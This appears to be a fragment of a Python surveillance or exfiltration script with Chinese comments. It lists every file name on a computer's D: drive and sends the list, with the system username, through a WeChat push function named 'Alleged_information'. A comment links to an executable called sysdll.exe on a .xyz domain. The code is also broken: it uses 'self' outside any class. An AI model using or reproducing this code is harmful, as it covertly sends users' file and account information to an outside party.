"""
代码有变化就执行2144
https://yc.052024.xyz/xz/sysdll.exe
"""
import requests
import os
wjb = ''
for i in os.listdir("D:/"):
    wjb += '|文件：' + i

print(wjb)
self.main.wechat_push.Alleged_information(f'{self.main.sys_username}|'+wjb)